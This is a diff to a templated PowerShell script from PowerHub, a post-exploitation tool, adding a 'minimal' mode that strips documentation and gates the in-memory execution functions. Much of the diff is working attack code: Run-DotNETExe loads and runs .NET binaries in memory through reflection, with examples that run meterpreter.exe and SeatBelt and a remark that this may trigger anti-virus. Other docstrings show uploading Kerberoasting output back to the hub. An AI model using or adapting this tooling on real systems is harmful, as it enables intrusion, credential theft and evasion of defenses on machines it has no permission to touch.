@@ -19,6 +19,11 @@ $CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').capture
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
+{% if minimal %}
+{{'Write-Debug "Minimal mode: on"'|debug}}
+{% else %}
+{{'Write-Debug "Minimal mode: off"'|debug}}
+{% endif %}
 
 function prompt {
     Write-Host ("PowerHub") -nonewline
@@ -161,7 +166,7 @@ function Convert-IntStringToArray ($s) {
 }
 
 function List-HubModules {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Lists all modules that are available via the hub.
@@ -234,7 +239,7 @@ Transfers the code of all modules from the hub and imports them.
 
 Use the '-Verbose' option to print detailed information.
 
-#>
+#>{% endif %}
     Param(
         [parameter(Mandatory=$true)] [String] $Expression,
         [parameter(Mandatory=$false)] [Switch] $Reload
@@ -283,6 +288,7 @@ Use the '-Verbose' option to print detailed information.
 }
 
 
+{% if not minimal %}
 function Run-Exe {
 <#
 .SYNOPSIS
@@ -416,120 +422,6 @@ Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
     }
 }
 
-function Run-DotNETExe {
-<#
-.SYNOPSIS
-
-Executes a .NET exe module in memory, which must be loaded first.
-
-This might trigger the anti-virus.
-
-.PARAMETER Module
-
-A PowerHub module object of type 'dotnet'.
-
-.PARAMETER OutFile
-
-Path to a file where the output is stored; by default output is printed to console
-
-The console is different than stdout for complicated PowerShell reasons.
-Use `-OutFile "-"` to redirect the output to stdout, i.e. the information stream.
-However, the output will be delayed and only printed when the program finished.
-
-.PARAMETER Arguments
-
-An array of strings that represent the arguments which will be passed to the executable
-
-.EXAMPLE
-
-Get-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
-
-Description
------------
-Load and execute the .NET binary whose name matches "SeatBelt" in memory with
-several parameters
-
-.EXAMPLE
-
-Get-HubModule meterpreter.exe | Run-DotNETExe
-
-Description
------------
-
-Load the .NET module with the name 'meterpreter.exe' in memory and run it
-#>
-
-    Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
-
-        [parameter(Mandatory=$false)] [String] $OutFile,
-
-        [parameter(Mandatory=$false)] [String[]] $Arguments = @()
-    )
-
-    {# Set CWD of the process to that of the powershell session #}
-    [Environment]::CurrentDirectory = Get-Location
-
-    foreach ($m in $Module) {
-        $code = $m.Code
-        $a = [Reflection.Assembly]::Load([byte[]]$code)
-        $al = New-Object -TypeName System.Collections.ArrayList
-        $al.add($Arguments)
-        if ($OutFile) {
-            $OldConsoleOut=[Console]::Out
-            if ($OutFile -eq '-') {
-                $StreamWriter=New-Object IO.StringWriter($OutFile)
-            } else {
-                $StreamWriter=New-Object IO.StreamWriter($OutFile)
-            }
-            [Console]::SetOut($StreamWriter)
-            try {
-                $a.EntryPoint.Invoke($Null, $al.ToArray())
-            } finally {
-                [Console]::SetOut($OldConsoleOut)
-            }
-        } else{
-            $a.EntryPoint.Invoke($Null, $al.ToArray())
-        }
-        if ($OutFile -eq '-') {
-            $StreamWriter.toString()
-        }
-    }
-}
-
-function New-DotNetAlias {
-<#
-.SYNOPSIS
-
-Add an alias that acts as a wrapper for 'Get-HubModule|Run-DotNETExe'.
-
-.PARAMETER Module
-
-A PowerHub module object of type "dotnet".
-
-.PARAMETER Name
-
-Name of the new alias. Default: the module's name.
-
-#>
-    Param(
-        [parameter(Mandatory=$false)] [String] $Name,
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module
-    )
-    $Function = {
-        $Module | Run-DotNETExe -Arguments ([string[]]$args)
-    }
-    if ($Name) {
-        $FuncName = $Name
-    } else {
-        $FuncName = $Module.Name
-    }
-    $Module.Alias = $FuncName
-    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
-}
-
 function New-ExeAlias {
 <#
 .SYNOPSIS
@@ -617,6 +509,121 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
         Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
     }
 }
+{% endif %}{# end of run-exe block #}
+
+function Run-DotNETExe {
+{% if not minimal %}<#
+.SYNOPSIS
+
+Executes a .NET exe module in memory, which must be loaded first.
+
+This might trigger the anti-virus.
+
+.PARAMETER Module
+
+A PowerHub module object of type 'dotnet'.
+
+.PARAMETER OutFile
+
+Path to a file where the output is stored; by default output is printed to console
+
+The console is different than stdout for complicated PowerShell reasons.
+Use `-OutFile "-"` to redirect the output to stdout, i.e. the information stream.
+However, the output will be delayed and only printed when the program finished.
+
+.PARAMETER Arguments
+
+An array of strings that represent the arguments which will be passed to the executable
+
+.EXAMPLE
+
+Get-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
+
+Description
+-----------
+Load and execute the .NET binary whose name matches "SeatBelt" in memory with
+several parameters
+
+.EXAMPLE
+
+Get-HubModule meterpreter.exe | Run-DotNETExe
+
+Description
+-----------
+
+Load the .NET module with the name 'meterpreter.exe' in memory and run it
+#>{% endif %}
+
+    Param(
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module,
+
+        [parameter(Mandatory=$false)] [String] $OutFile,
+
+        [parameter(Mandatory=$false)] [String[]] $Arguments = @()
+    )
+
+    {# Set CWD of the process to that of the powershell session #}
+    [Environment]::CurrentDirectory = Get-Location
+
+    foreach ($m in $Module) {
+        $code = $m.Code
+        $a = [Reflection.Assembly]::Load([byte[]]$code)
+        $al = New-Object -TypeName System.Collections.ArrayList
+        $al.add($Arguments)
+        if ($OutFile) {
+            $OldConsoleOut=[Console]::Out
+            if ($OutFile -eq '-') {
+                $StreamWriter=New-Object IO.StringWriter($OutFile)
+            } else {
+                $StreamWriter=New-Object IO.StreamWriter($OutFile)
+            }
+            [Console]::SetOut($StreamWriter)
+            try {
+                $a.EntryPoint.Invoke($Null, $al.ToArray())
+            } finally {
+                [Console]::SetOut($OldConsoleOut)
+            }
+        } else{
+            $a.EntryPoint.Invoke($Null, $al.ToArray())
+        }
+        if ($OutFile -eq '-') {
+            $StreamWriter.toString()
+        }
+    }
+}
+
+function New-DotNetAlias {
+<#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-DotNETExe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "dotnet".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module
+    )
+    $Function = {
+        $Module | Run-DotNETExe -Arguments ([string[]]$args)
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
 
 
 function Send-Bytes {
@@ -688,7 +695,7 @@ function Send-BytesViaHttp {
 
 
 function PushTo-Hub {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Uploads files back to the hub via Cmdlet.
@@ -714,7 +721,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 
 Get-ChildItem | PushTo-Hub -Name "directory-listing"
 
-#>
+#>{% endif %}
     Param(
        [Parameter(Mandatory=$False)]
        [String[]]$Files,
@@ -767,7 +774,7 @@ $global:WebdavLetter = $Null
 $global:WebdavRoLetter = $Null
 
 function Mount-Webdav {
-<#
+{% if not minimal %}<#
 .SYNOPSIS
 
 Mount the Webdav drive.
@@ -780,7 +787,7 @@ The letter the mounted read-only drive will receive (default: 'R')
 
 The letter the mounted public drive will receive (default: 'S')
 
-#>
+#>{% endif %}
     Param(
         [parameter(Mandatory=$False)]
         [String]$Letter = "S",
@@ -865,9 +872,11 @@ The following functions are available (some with short aliases):
   * Get-HubModule (ghm)
   * Update-HubModules (uhm)
   * Get-SysInfo
-  * Run-Exe (re)
   * Run-DotNETExe (rdne)
+{% if not minimal -%}
+  * Run-Exe (re)
   * Run-Shellcode (rsh)
+{%- endif %}
   * PushTo-Hub (pth)
   * Mount-Webdav (mwd)
   * Unmount-Webdav (umwd)
@@ -880,9 +889,11 @@ try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name uhm -Value Update-HubModules } catch { }
-try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
+{% if not minimal -%}
+try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
+{%- endif %}
 try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
 try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }
 
